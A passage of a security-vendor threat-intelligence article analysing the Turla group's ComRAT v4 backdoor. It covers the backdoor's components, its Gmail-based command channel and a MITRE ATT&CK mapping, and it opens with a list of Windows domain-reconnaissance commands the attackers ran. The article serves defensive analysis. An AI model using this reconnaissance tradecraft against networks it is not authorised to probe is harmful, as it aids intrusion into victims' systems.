						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581be8c8122754430777-1"><span class="crayon-v">gpresult</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">z</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be8c8122754430777-2"><span class="crayon-v">gpresult</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">v</span></div><div class="crayon-line" id="crayon-60581be8c8122754430777-3"><span class="crayon-e">gpresult</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be8c8122754430777-4"><span class="crayon-e">net </span><span class="crayon-e">view</span></div><div class="crayon-line" id="crayon-60581be8c8122754430777-5"><span class="crayon-e">net </span><span class="crayon-v">view</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-e">domain</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be8c8122754430777-6"><span class="crayon-e">netstat</span></div><div class="crayon-line" id="crayon-60581be8c8122754430777-7"><span class="crayon-v">netstat</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">nab</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be8c8122754430777-8"><span class="crayon-v">netstat</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">nao</span></div><div class="crayon-line" id="crayon-60581be8c8122754430777-9"><span class="crayon-i">nslookup</span><span class="crayon-h"> </span><span class="crayon-cn">127.0.0.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be8c8122754430777-10"><span class="crayon-v">ipconfig</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-e">all</span></div><div class="crayon-line" id="crayon-60581be8c8122754430777-11"><span class="crayon-v">arp</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">a</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be8c8122754430777-12"><span class="crayon-e">net </span><span class="crayon-e">share</span></div><div class="crayon-line" id="crayon-60581be8c8122754430777-13"><span class="crayon-e">net </span><span class="crayon-st">use</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be8c8122754430777-14"><span class="crayon-e">systeminfo</span></div><div class="crayon-line" id="crayon-60581be8c8122754430777-15"><span class="crayon-e">net </span><span class="crayon-e">user</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be8c8122754430777-16"><span class="crayon-e">net </span><span class="crayon-e">user </span><span class="crayon-e">administrator</span></div><div class="crayon-line" id="crayon-60581be8c8122754430777-17"><span class="crayon-e">net </span><span class="crayon-v">user</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-e">domain</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be8c8122754430777-18"><span class="crayon-e">net </span><span class="crayon-e">group</span></div><div class="crayon-line" id="crayon-60581be8c8122754430777-19"><span class="crayon-e">net </span><span class="crayon-v">group</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-e">domain</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be8c8122754430777-20"><span class="crayon-e">net </span><span class="crayon-e">localgroup</span></div><div class="crayon-line" id="crayon-60581be8c8122754430777-21"><span class="crayon-e">net </span><span class="crayon-e">localgroup</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be8c8122754430777-22"><span class="crayon-e">net </span><span class="crayon-e">localgroup </span><span class="crayon-e">Administrators</span></div><div class="crayon-line" id="crayon-60581be8c8122754430777-23"><span class="crayon-e">net </span><span class="crayon-i">group</span><span class="crayon-h"> </span><span class="crayon-s">"Domain Computers"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-e">domain</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be8c8122754430777-24"><span class="crayon-e">net </span><span class="crayon-i">group</span><span class="crayon-h"> </span><span class="crayon-s">"Domain Admins"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-e">domain</span></div><div class="crayon-line" id="crayon-60581be8c8122754430777-25"><span class="crayon-e">net </span><span class="crayon-i">group</span><span class="crayon-h"> </span><span class="crayon-s">"Domain Controllers"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-e">domain</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be8c8122754430777-26"><span class="crayon-i">dir</span><span class="crayon-h"> </span><span class="crayon-s">"%programfiles%"</span></div><div class="crayon-line" id="crayon-60581be8c8122754430777-27"><span class="crayon-e">net </span><span class="crayon-i">group</span><span class="crayon-h"> </span><span class="crayon-s">"Exchange Servers"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-e">domain</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be8c8122754430777-28"><span class="crayon-e">net </span><span class="crayon-e">accounts</span></div><div class="crayon-line" id="crayon-60581be8c8122754430777-29"><span class="crayon-e">net </span><span class="crayon-v">accounts</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-e">domain</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be8c8122754430777-30"><span class="crayon-e">net </span><span class="crayon-i">view</span><span class="crayon-h"> </span><span class="crayon-cn">127.0.0.1</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-e">all</span></div><div class="crayon-line" id="crayon-60581be8c8122754430777-31"><span class="crayon-e">net </span><span class="crayon-e">session</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be8c8122754430777-32"><span class="crayon-e">route </span><span class="crayon-e">print</span></div><div class="crayon-line" id="crayon-60581be8c8122754430777-33"><span class="crayon-v">ipconfig</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">displaydns</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p><em>Figure 3. Basic recon of the compromised machine</em></p>
<p>Finally, we also noticed that Turla operators are aware of and try to evade security software. For instance, they regularly exfiltrate security-related log files in order to understand whether their malware samples have been detected. This shows the level of sophistication of this group and its intention to stay on the same machines for a long time.</p>
<h2>Technical analysis</h2>
<p>According to its compilation timestamp, which is likely genuine, the first known sample of ComRAT v4 was compiled in April 2017. The most recent iteration of the backdoor we’ve seen was, to the best of our knowledge, compiled in November 2019.</p>
<p>Based on ESET telemetry, we believe that ComRAT is installed using an existing foothold such as compromised credentials or via another Turla backdoor. For instance, we&#8217;ve seen ComRAT installed by <a href="https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/">PowerStallion</a>, their PowerShell-based backdoor we described in 2019.</p>
<p>The ComRAT installer is a PowerShell script that creates a Windows scheduled task and fills a Registry value with the encrypted payload.</p>
<p>ComRAT v4 has several components:</p>
<ul>
<li>an orchestrator, injected into <span style="font-family: courier new, courier, monospace;">explorer.exe</span>. It controls most of ComRAT functions including the execution of backdoor commands.</li>
<li>a communication module (a DLL), injected into the default browser by the orchestrator. It communicates with the orchestrator using a named pipe.</li>
<li>a Virtual FAT16 File System, containing the configuration and the logs files.</li>
</ul>
<p>Figure 4 is an overview of ComRAT’s architecture.</p>
<div id="attachment_138962" style="width: 710px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2020/05/Figure-4-1.png"><img class="wp-image-138962 size-full" src="https://www.welivesecurity.com/wp-content/uploads/2020/05/Figure-4-1.png" alt="" width="700" height="844" srcset="https://www.welivesecurity.com/wp-content/uploads/2020/05/Figure-4-1.png 700w, https://www.welivesecurity.com/wp-content/uploads/2020/05/Figure-4-1-249x300.png 249w" sizes="(max-width: 700px) 100vw, 700px" /></a><p class="wp-caption-text"><i>Figure 4. Summary of ComRAT architecture</i></p></div>
<p>ComRAT v4 has two different C&amp;C channels: HTTP (known internally as legacy), which (surprise surprise) uses the HTTP protocol, and email (known internally as mail), which uses the Gmail web interface.</p>
<p>In the latter mode and using cookies stored in the configuration, it connects to the Gmail web interface in order to check the inbox and download specific mail attachments that contain encrypted commands. These commands are sent by the malware operators from another address, generally hosted on a different free email provider such as GMX.</p>
<p><em>A detailed technical analysis of all ComRAT’s components is available in the <a href="https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf" target="_blank" rel="noopener">white paper</a></em><em>.</em></p>
<h2>Conclusion</h2>
<p>ComRAT v4 is a totally revamped malware family released in 2017. Its developers took inspiration from other Turla backdoors, such as Snake, to build a very complex piece of malware.</p>
<p>Its most interesting feature is the use of the Gmail web UI to receive commands and exfiltrate data. Thus, it is able to bypass some security controls because it doesn’t rely on any malicious domain. We also noticed that this new version abandoned the use of COM object hijacking for persistence, the method that gave the malware its common name.</p>
<p>We found indications that ComRAT v4 was still in use at the beginning of 2020, showing that the Turla group is still very active and a major threat for diplomats and militaries.</p>
<p>A full and comprehensive list of Indicators of Compromise (IoCs) and samples can be found in the full <a href="https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf" target="_blank" rel="noopener">white paper</a> and in <a href="https://github.com/eset/malware-ioc/tree/master/turla#turla-comrat-v4-indicators-of-compromise" target="_blank" rel="noopener">our GitHub repository</a>.</p>
<p>For a detailed analysis of the backdoor, refer to our white paper. <em>For any inquiries, or to make sample submissions related to the subject, contact us at threatintel@eset.com</em>.</p>
<h2>MITRE ATT&amp;CK techniques</h2>

<table id="tablepress-843" class="tablepress tablepress-id-843">
<thead>
<tr class="row-1 odd">
	<th class="column-1">Tactic</th><th class="column-2">Id</th><th class="column-3">Name</th><th class="column-4">Description</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1">Execution</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1086/" rel="noopener" target="_blank">T1086</a></td><td class="column-3">PowerShell</td><td class="column-4">A PowerShell script is used to install ComRAT.</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1">Persistence</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1053/" rel="noopener" target="_blank">T1053</a></td><td class="column-3">Scheduled Task</td><td class="column-4">ComRAT uses a scheduled task to launch its PowerShell loader.</td>
</tr>
<tr class="row-4 even">
	<td rowspan="3" class="column-1">Defense Evasion</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1027/" rel="noopener" target="_blank">T1027</a></td><td class="column-3">Obfuscated Files or Information</td><td class="column-4">The ComRAT orchestrator is stored encrypted and only decrypted upon execution.</td>
</tr>
<tr class="row-5 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1055/" rel="noopener" target="_blank">T1055</a></td><td class="column-3">Process Injection</td><td class="column-4">The ComRAT orchestrator is injected into <span style="font-family: courier new, courier, monospace;"> explorer.exe</span> . The communication DLL is injected into the default browser.</td>
</tr>
<tr class="row-6 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1112/" rel="noopener" target="_blank">T1112</a></td><td class="column-3">Modify Registry</td><td class="column-4">The ComRAT orchestrator is stored encrypted in the Registry.</td>
</tr>
<tr class="row-7 odd">
	<td rowspan="8" class="column-1">Discovery</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1016/" rel="noopener" target="_blank">T1016</a></td><td class="column-3">System Network Configuration Discovery</td><td class="column-4">Operators execute <span style="font-family: courier new, courier, monospace;"> ipconfig</span>  and <span style="font-family: courier new, courier, monospace;"> nbstat</span> .</td>
</tr>
<tr class="row-8 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1033/" rel="noopener" target="_blank">T1033</a></td><td class="column-3">System Owner/User Discovery</td><td class="column-4">Operators execute <span style="font-family: courier new, courier, monospace;"> net user</span> .</td>
</tr>
<tr class="row-9 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1069/" rel="noopener" target="_blank">T1069</a></td><td class="column-3">Permission Groups Discovery</td><td class="column-4">Operators execute <span style="font-family: courier new, courier, monospace;"> net group /domain</span> .</td>
</tr>
<tr class="row-10 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1082/" rel="noopener" target="_blank">T1082</a></td><td class="column-3">System Information Discovery</td><td class="column-4">Operators execute <span style="font-family: courier new, courier, monospace;"> systeminfo</span> .</td>
</tr>
<tr class="row-11 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1083/" rel="noopener" target="_blank">T1083</a></td><td class="column-3">File and Directory Discovery</td><td class="column-4">Operators list the content of several directories. Example: <span style="font-family: courier new, courier, monospace;"> dir /og-d  "%userprofile%\AppData\Roaming\Microsoft\Windows\Recent\*.*"</span> .</td>
</tr>
<tr class="row-12 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1087/" rel="noopener" target="_blank">T1087</a></td><td class="column-3">Account Discovery</td><td class="column-4">Operators execute <span style="font-family: courier new, courier, monospace;"> net user</span>  and  <span style="font-family: courier new, courier, monospace;">net group</span> .</td>
</tr>
<tr class="row-13 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1120/" rel="noopener" target="_blank">T1120</a></td><td class="column-3">Peripheral Device Discovery</td><td class="column-4">Operators execute <span style="font-family: courier new, courier, monospace;"> fsutil fsinfo drives</span>  to list the connected drives.</td>
</tr>
<tr class="row-14 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1135/" rel="noopener" target="_blank">T1135</a></td><td class="column-3">Network Share Discovery</td><td class="column-4">Operators execute <span style="font-family: courier new, courier, monospace;"> net view</span> .</td>
</tr>
<tr class="row-15 odd">
	<td class="column-1">Collection</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1213/" rel="noopener" target="_blank">T1213</a></td><td class="column-3">Data from Information Repositories</td><td class="column-4">The Operators use a custom tool to exfiltrate documents from an internal central database.</td>
</tr>
<tr class="row-16 even">
	<td rowspan="4" class="column-1">Command and Control</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1024/" rel="noopener" target="_blank">T1024</a></td><td class="column-3">Custom Cryptographic Protocol</td><td class="column-4">ComRAT uses RSA and AES to encrypt C&amp;C data.</td>
</tr>
<tr class="row-17 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1043/" rel="noopener" target="_blank">T1043</a></td><td class="column-3">Commonly Used Port</td><td class="column-4">ComRAT uses ports 80 and 443.</td>
</tr>
<tr class="row-18 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1071/" rel="noopener" target="_blank">T1071</a></td><td class="column-3">Standard Application Layer Protocol</td><td class="column-4">ComRAT uses HTTP and HTTPS.</td>
</tr>
<tr class="row-19 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1102/" rel="noopener" target="_blank">T1102</a></td><td class="column-3">Web Service</td><td class="column-4">ComRAT can be controlled via the Gmail web UI.</td>
</tr>
<tr class="row-20 even">
	<td rowspan="3" class="column-1">Exfiltration</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1002/" rel="noopener" target="_blank">T1002</a></td><td class="column-3">Data Compressed</td><td class="column-4">The documents are compressed in a RAR archive.</td>
</tr>
<tr class="row-21 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1022/" rel="noopener" target="_blank">T1022</a></td><td class="column-3">Data Encrypted</td><td class="column-4">The RAR archive is encrypted with a password.</td>
</tr>
<tr class="row-22 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1048/" rel="noopener" target="_blank">T1048</a></td><td class="column-3">Exfiltration Over Alternative Protocol</td><td class="column-4">Data is exfiltrated to cloud storage, mounted locally using the <span style="font-family: courier new, courier, monospace;">net use</span> command.</td>
</tr>
</tbody>
</table>


                            
                                                            <div class="dot">
                                    <span class="icomoon icon-icon_article_dot"></span>
                                </div>

                                <div class="meta">
                                    <div class="wls-authors wls-authors-footer">
                                                <div class="wls-author">
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/mfaou/" title="Matthieu Faou">
                    Matthieu Faou                </a>
            </div>
        </div>
                                            </div>
                                    <span class="strong">
								        <time datetime="2020-05-26 11:30:38">26 May 2020 - 11:30AM</time>
                                    </span>
                                </div>
                            
                            <div class="widgets row">
                                <div class="col-md-12 col-sm-12 col-xs-12">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12 no-padding">
                                        <h3><span class="text">Newsletter</span></h3>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-6 col-xs-12 newsletter-wrapper">
                                    			
		<div class="heading-line col-md-12 no-padding sidebar-item clearfix">
			<h3>
				<span class="text">Newsletter</span>
			</h3>

			<form action="//liondigital.us3.list-manage.com/subscribe/post?u=b76f82b1cc198ab1d80665c99&amp;id=102b0810e2" class="basic-searchform col-md-12 col-sm-12 col-xs-12 no-padding newsletter" method="post" role="search">
				<div class="search-input clearfix">
					<input type="text" name="email" value="" placeholder="Email...">
					<button>
						Submit					</button>
				</div>
			</form>		
		</div>
                                </div>
                            </div>

                                                            <div class="similar-articles row">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12">
                                        <h3><span class="text">Similar Articles</span></h3>
                                    </div>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/cybercrime/" class="category-tag-btn">Cybercrime</a>                                                <a href="https://www.welivesecurity.com/2021/03/18/fbi-cybercrime-losses-topped-us42billion-2020/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/03/fbi-cybercrime-losses-2020-ic3-623x432.jpg"
                                                         alt="From Agent.BTZ to ComRAT&nbsp;v4: A ten&#8209;year journey">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/03/18/fbi-cybercrime-losses-topped-us42billion-2020/">
                                                    FBI: Cybercrime losses topped US$4.2 billion in 2020                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/03/exchange-servers-under-siege-10-apt-groups-623x432.jpg"
                                                         alt="From Agent.BTZ to ComRAT&nbsp;v4: A ten&#8209;year journey">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/">
                                                    Exchange servers under siege from at least 10 APT groups                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/02/18/malware-authors-already-taking-aim-apple-m1-macs/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/02/apple-m1-macs-malware-1-623x432.jpg"
                                                         alt="From Agent.BTZ to ComRAT&nbsp;v4: A ten&#8209;year journey">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/02/18/malware-authors-already-taking-aim-apple-m1-macs/">
                                                    Malware authors already taking aim at Apple M1 Macs                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/02/02/kobalos-complex-linux-threat-high-performance-computing-infrastructure/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/02/eset-kobalos-hpc-high-performance-computing-malware-research-623x432.jpg"
                                                         alt="From Agent.BTZ to ComRAT&nbsp;v4: A ten&#8209;year journey">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/02/02/kobalos-complex-linux-threat-high-performance-computing-infrastructure/">
                                                    Kobalos – A complex Linux threat to high performance computing infrastructure                                                </a>
                                            </h4>
                                        </article>
                                                                    </div>
                            
                            <div class="comments row">
                                <div class="heading-line col-xs-12">
                                    <h3><span class="text">Discussion</span></h3>
                                                                            
<div id="disqus_thread"></div>
                                                                    </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    	</div> 	<footer id="site-footer">
		<div class="container">
			<div class="row">
				<div class="col-md-2">
                    <div class="hidden-sm hidden-xs">
                        <div class="logo-wrapper footer clearfix">
                            <div class="dark clearfix">
                                <a href="https://www.welivesecurity.com/" class="wls">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-1.svg" alt="Welivesecurity.com">
                                </a>
                                <a href="https://www.eset.com" class="eset">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-2.svg" alt="by ESET">
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="hidden-lg hidden-md">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
				</div>
				<nav id="footer" class="clearfix">
											<div class="mobile-block">
																<div class="col-md-2 col-md-offset-2">
										<ul>
																							<li>
													<a href="/">Home</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/about-us/">About Us</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/contact-us/">Contact Us</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/sitemap/">Sitemap</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/our-experts/">Our Experts</a>
												</li>
																							<li>
													<a href="https://eset.com">ESET</a>
												</li>
																					</ul>
									</div>
													</div>
											<div class="mobile-block">
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/research/">Research</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/category/how-to/">How To</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/categories/">Categories</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/rss-configurator/">RSS Configurator</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/news-widget-generator/">News Widget</a>
												</li>
																					</ul>
									</div>
													</div>
									</nav>
			</div>
			<div class="row">
				<div class="col-md-12 legal clearfix">
					<div class="wrap clearfix">
													<span>
								<a href="https://www.welivesecurity.com/privacy/">
									Privacy policy								</a>
							</span>
													<span>
								<a href="https://www.welivesecurity.com/legal-information/">
									Legal Information								</a>
							</span>
											</div>
					<span class="copyright pull-right">Copyright &copy; ESET, All Rights Reserved</span>
				</div>
							</div>
		</div>
	</footer>
	
	<button id="back-to-top" class="animated-scroll" data-target="absoluteTop">
		<span class="icomoon icon-icon_arrow"></span>
		<span class="text">Back to top</span>
	</button>

			<div class="social-wrapper-mobile hidden-lg hidden-md hidden-sm" id="mobile-article-sharer">
			<div class="col-xs-12">
				<div class="icons" style="text-align: center;">
											<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2020%2F05%2F26%2Fagentbtz-comratv4-ten-year-journey%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
							<span class="icomoon icon-icon_fb"></span>
						</a>
											<a class="share-twitter" href="https://twitter.com/intent/tweet?https%3A%2F%2Fwww.welivesecurity.com%2F2020%2F05%2F26%2Fagentbtz-comratv4-ten-year-journey%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
							<span class="icomoon icon-icon_tw"></span>
						</a>
											<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2020%2F05%2F26%2Fagentbtz-comratv4-ten-year-journey%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
							<span class="icomoon icon-icon_in"></span>
						</a>
									</div>
			</div>
		</div>
	
	<script>
		var baseUrl = "https://www.welivesecurity.com/";
	</script>
	
			<script>
            !function(){if(-1==window.document.cookie.indexOf("user_rec=1")){function e(e,o){var t=document.createElement("img");t.setAttribute("style","display:none"),t.src=e+o,window.document.body.appendChild(t)}function o(){d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Default%20status&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=defaultStatus&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c)}function t(){console.log("GA and GTM are loaded."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=11",e(u,a),e(s,c)}function n(){var e=new Date;e.setTime(e.getTime()+63072e6);var o="expires="+e.toUTCString();window.document.cookie="user_rec=1; "+o+"; path=/"}var d,a,c,i,r,l="UA-76266002-27",g=window.location.href,s="https://cdn1.esetstatic.com/ESET/INT/assets/img/check.png",u="https://www.google-analytics.com/collect",w="wls",m=0,h=function e(){i=window.ga&&ga.create?1:0,r=window.google_tag_manager?1:0,m++,console.log("Timer: ",m),h=setTimeout(e,500)};window.document.addEventListener&&(d=1e6*Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Script%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=scriptLoaded&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c),window.addEventListener("beforeunload",o),window.ga&&ga.create&&window.google_tag_manager?(t(),window.removeEventListener("beforeunload",o),n()):(setTimeout(h,500),setTimeout(function(){clearTimeout(h),i&&r?t():i&&!r?(console.log("GA is loaded and GTM is blocked."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=10",e(u,a),e(s,c)):!i&&r?(console.log("GA is blocked and GTM is loaded."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=01",e(u,a),e(s,c)):i||r||(console.log("GA is blocked and GTM is blocked."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=00",e(u,a),e(s,c)),window.removeEventListener("beforeunload",o),n()},1e4)))}}();
		</script>
	
	<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/build/js/main-0ba0c3843d.js"></script>
    <!-- Version: v1.1.76.32619db9.pro-awus -->
    		<script type="text/javascript">
			var disqus_config = function () { 
				this.language = "en";
			};
			var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":"", "numsVisible": false};
			var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
		</script>
		<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/static/js/crayon.min.js"></script>

			
		
    <script>
    	Main.init();
    </script>

    <script type='text/javascript'>
/* <![CDATA[ */
var countVars = {"disqusShortname":"welivesecurity"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_count.js?ver=3.0.16'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var embedVars = {"disqusConfig":{"integration":"wordpress 3.0.16"},"disqusIdentifier":"138864 https:\/\/backend.welivesecurity.com\/?p=138864","disqusShortname":"welivesecurity","disqusTitle":"From Agent.BTZ to ComRAT\u00a0v4: A ten\u2011year journey","disqusUrl":"https:\/\/www.welivesecurity.com\/2020\/05\/26\/agentbtz-comratv4-ten-year-journey\/","postId":"138864"};
/* ]]> */
</script>
